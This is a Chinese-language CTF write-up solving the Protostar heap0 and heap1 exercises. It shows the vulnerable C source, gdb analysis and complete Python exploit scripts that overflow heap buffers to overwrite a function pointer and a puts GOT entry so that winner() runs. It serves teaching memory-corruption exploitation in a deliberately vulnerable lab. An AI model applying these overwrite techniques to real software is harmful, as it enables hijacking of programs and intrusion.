# Protostar: Heap 0

This level introduces heap overflows and how they can influence code flow.

This level is at `/opt/protostar/bin/heap0`.

### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);
  
  f->fp();

}
```



## 攻击目标

改变程序控制流，让`winner()`执行，输出`level passed`。



## 攻击过程

```shell
$ cat heap0.py
buffer = ""
for i in range(0x41, 0x53):
    buffer += chr(i) * 4
target = "\x64\x84\x04\x08"
print buffer + target
$ ./heap0 `python heap0.py`
data is at 0x804a008, fp is at 0x804a050
level passed
```

<img src=".\heap0-result.png" style="zoom:67%;" />



## 原理分析

分析源码可知，如果程序正常运行，应该执行`nonwinner()`，打印`level has not been passed`。

本题要利用的是`strcpy()`的溢出漏洞，它不会检查拷贝内容的长度，从而造成接收处空间的溢出。

准备一个长字符串。

```python
# exp.py
buffer = ""
for i in range(0x41, 0x5b):
    buffer += chr(i) * 4
print buffer

'''
Output: AAAABBBBCCCCDDDDEEEEFFFFZZZZHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
'''
```

查看`main()`函数的汇编代码：

<img src=".\heap0-disas-1.png" style="zoom:67%;" />

<img src=".\heap0-disas-2.png" style="zoom:67%;" />

在`strcpy()`后打断点，将准备好的长字符串作为输入。

```shell
(gdb) r `python exp.py`
```

<img src=".\heap0-analysis-1.png" style="zoom:67%;" />

由输出可知0x804a008为堆上d的地址，查看堆上内存。

```shell
(gdb) x/64wx 0x804a008 # 查看堆上从d的位置往下64DWORD 或用 x/1s 0x0804a050
(gdb) c # 继续执行
```

<img src=".\heap0-analysis-2.png" style="zoom:67%;" />

发生的Segmentation fault说明*fp中存储的`nonwinner()`的地址被覆写为0x53535353。

如果我们想要改变控制流，需要把`winner()`函数的入口地址写到0x53535353所在的位置。

查看`winner()`的入口地址：

```shell
(gdb) p winner
```

<img src=".\heap0-analysis-3.png" style="zoom:67%;" />

由此可构造攻击脚本：

```python
# heap0.py
buffer = ""
for i in range(0x41, 0x53):
    buffer += chr(i) * 4
target = "\x64\x84\x04\x08" # winner()入口地址
print buffer + target
```

<div STYLE="page-break-after: always;"></div>

# Protostar: Heap 1

This level takes a look at code flow hijacking in data overwrite cases.

This level is at `/opt/protostar/bin/heap1`.

### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```



## 攻击目标

改变程序控制流，让`winner()`执行。



## 攻击过程

```shell
$ cat heap1.py
arg1_padding = "AAAABBBBCCCCDDDDEEEE"
ret = "\x74\x97\x04\x08 "
arg2 = "\x94\x84\x04\x08"
print arg1_padding + ret + arg2
$ ./heap1 `python heap1.py`
and we have a winner @ 1711319487
```

<img src=".\heap1-result.png" style="zoom:67%;" />



## 原理分析

由源码可知，如果程序正常运行，`winner()`不会被执行。

```shell
(gdb) info proc map
```

<img src=".\heap1-analysis-6.png" style="zoom:67%;" />

可以看到堆上地址为0x804a000~0x806b000，栈上地址为0xbffeb000~0xc0000000。

程序中的本地变量会在栈上分配内存，使用malloc等关键字创建的变量会在堆上分配内存。在栈上产生的变量，它何时生成、何时消亡，以及在内存中会开辟多大的空间给它，都是由编译器决定的。但在堆上开辟的空间、空间大小，是由程序员在程序中控制的。堆内存分配速度比较缓慢，但可用空间大。堆上的数据块之间可以不存在关联，它们是由类似链表的方式进行管理的。

下面用一个例子说明malloc如何分配堆内存。

```c
a = malloc(16);
b = malloc(24);
c = malloc(10);
d = malloc(16);
```

分配后的堆内存如图所示：

<img src=".\heap1-analysis-1.png" style="zoom:67%;" />

中间短小的空隙是它们的“头”，灰色的部分是被分配给它们的空间。“头”会携带一些指针或管理信息，是给堆管理器使用的。程序员在写完代码后得到的地址，是灰色块的起始地址，而不是“头”的起始地址。

分析本题源码，堆内存分配如下：

<img src=".\heap1-analysis-2.png" style="zoom:67%;" />

本题要利用的仍然是`strcpy()`的溢出漏洞，它不会检查拷贝内容的长度，从而造成接收处空间的溢出。

<img src=".\heap1-analysis-3.png" style="zoom:67%;" />

我们可以利用第一次复制将i2的\*name指针覆写为一个\*somewhere指针，指向eip最终会去到的地址；第二次复制会将内容复制到i2的*name指针指向的地方，所以可利用第二次复制将`winner()`函数的入口地址写到\*somewhere指针指向的地方，从而实现攻击。

<img src=".\heap1-analysis-4.png" style="zoom:67%;" />

那我们应该如何构造\*somewhere指针呢？有两种方法：第一种是利用`main()`的返回地址，但在本题中，`main()`的返回地址的位置是漂移的（有时候，一些环境变量长短的变化，会造成esp位置的漂移），没有一个确定的地址，所以不可行；第二种方法是利用一些程序中的一些系统函数调用，调用时eip会跳转到相应函数的地址，本题中可以利用`printf()`。

使用工具ltrace查看几次malloc分配的空间的地址：

> ltrace：跟踪程序运行时动态链接库的库函数调用情况。

```shell
$ ltrace ./heap1
```

<img src=".\heap1-analysis-10.png" style="zoom:67%;" />

`malloc()`就是glic库中的函数。

查看`main()`的汇编代码：

<img src=".\heap1-disas-1.png" style="zoom:67%;" />

<img src=".\heap1-disas-2.png" style="zoom:67%;" />

查看`winner()`函数的入口地址：

```shell
(gdb) p winner # 入口地址为0x08048494
```

<img src=".\heap1-analysis-5.png" style="zoom:67%;" />

在leave处（0x08048566）打断点，运行程序，查看堆上内存。

```shell
(gdb) b *0x08048566
(gdb) r AAAABBBB 11112222
(gdb) x/64wx 0x0804a000 # 查看堆顶往下64DWORD
```

<img src=".\heap1-analysis-7.png" style="zoom:67%;" />

得到i1->name与i2的*name间隔为5DWORD。

查看`printf()`对应的系统调用puts的具体步骤。

```shell
(gdb) disas 0x80483cc
```

<img src=".\heap1-analysis-8.png" style="zoom:67%;" />

可以看到在puts中再次发生了跳转。查看跳转地址指向的内容：

```shell
(gdb) x *0x8049774
```

<img src=".\heap1-analysis-9.png" style="zoom:67%;" />

可以看到指向的是`_IO_puts()`函数。

所以可以将*somewhere设置为0x08049774。

由此构造攻击脚本：

```python
# heap1.py
arg1_padding = "AAAABBBBCCCCDDDDEEEE"
ret = "\x74\x97\x04\x08 " # puts@GOT跳转地址（最后有个空格）
arg2 = "\x94\x84\x04\x08" # winner()入口地址
print arg1_padding + ret + arg2
```
